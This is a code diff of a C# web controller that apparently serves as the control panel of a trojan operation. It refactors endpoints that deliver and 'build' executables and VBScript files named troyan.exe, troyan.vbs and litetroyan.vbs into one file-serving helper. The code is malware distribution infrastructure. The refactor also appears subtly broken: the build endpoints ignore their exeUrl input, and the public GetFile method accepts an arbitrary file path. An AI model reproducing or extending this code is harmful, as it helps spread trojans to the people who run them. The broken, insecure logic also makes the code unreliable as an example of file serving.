@@ -145,18 +145,15 @@ public class CpController : Controller
         }
     }
 
-    [HttpGet("{server}/GetExe")]
-    public IActionResult GetExe(string server)
+    public IActionResult GetFile(string serverFile, string fileName)
     {
         try
         {
-            server = Server(server);
-            var exeFile = _serverService.GetExe(server);
-            if (!System.IO.File.Exists(exeFile))
+            if (!System.IO.File.Exists(serverFile))
                 return NotFound();
-            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetExe(server));
+            var fileBytes = System.IO.File.ReadAllBytes(serverFile);
             Response.Headers.Add("Content-Type", "application/octet-stream");
-            return File(fileBytes, "application/octet-stream", "troyan.exe");
+            return File(fileBytes, "application/octet-stream", fileName.Split(".")[0] + "_" + System.Environment.TickCount.ToString() + "." + fileName.Split(".")[1] );
         }
         catch (Exception)
         {
@@ -164,60 +161,43 @@ public class CpController : Controller
         }
     }
 
+    [HttpGet("{server}/GetExe")]
+    public IActionResult GetExe(string server)
+    {
+        return GetFile(_serverService.GetExe(server), "troyan.exe");
+    }
+
     [HttpGet("{server}/BuildExe")]
     public IActionResult BuildExe(string server, string exeUrl)
     {
-        try
-        {
-            server = Server(server);
-            if (!System.IO.File.Exists(_serverService.GetExe(server))) 
-                return NotFound();
-            var fileBytes = System.IO.File.ReadAllBytes(_serverService.BuildExe(server, exeUrl));
-            Response.Headers.Add("Content-Type", "application/octet-stream");
-            return File(fileBytes, "application/octet-stream", "troyan_spec.exe");
-        }
-        catch (Exception)
-        {
-            return StatusCode(500, "Internal server error");
-        }
+        return GetFile(_serverService.GetExe(server), "troyan.exe");
     }
-    
-        
+
     [HttpGet("{server}/GetVbs")]
     public IActionResult GetVbs(string server)
     {
-        try
-        {
-            server = Server(server);
-            if (!System.IO.File.Exists(_serverService.GetVbs(server)))
-                return NotFound();
-            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetVbs(server));
-            Response.Headers.Add("Content-Type", "text/vbscript");
-            return File(fileBytes, "application/octet-stream", "troyan.vbs");
-        }
-        catch (Exception)
-        {
-            return StatusCode(500, "Internal server error");
-        }
+        return GetFile(_serverService.GetVbs(server), "troyan.vbs");
     }
     
     [HttpGet("{server}/BuildVbs")]
     public IActionResult BuildVbs(string server, string exeUrl)
     {
-        try
-        {
-            server = Server(server);
-            if (!System.IO.File.Exists(_serverService.GetVbs(server))) 
-                return NotFound();
-            var fileBytes = System.IO.File.ReadAllBytes(_serverService.BuildExe(server, exeUrl));
-            Response.Headers.Add("Content-Type", "application/octet-stream");
-            return File(fileBytes, "application/octet-stream", "troyan_spec.vbs");
-        }
-        catch (Exception)
-        {
-            return StatusCode(500, "Internal server error");
-        }
+        return GetFile(_serverService.GetLiteVbs(server), "troyan.vbs");
     }
+    
+    [HttpGet("{server}/GetLiteVbs")]
+    public IActionResult GetLiteVbs(string server)
+    {
+        return GetFile(_serverService.GetLiteVbs(server), "litetroyan.vbs");
+    }
+        
+    [HttpGet("{server}/BuildLiteVbs")]
+    public IActionResult BuildLiteVbs(string server)
+    {
+        return GetFile(_serverService.GetLiteVbs(server), "litetroyan.vbs");
+    }
+    
+
     
     [HttpPost()]
     public IActionResult Index(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
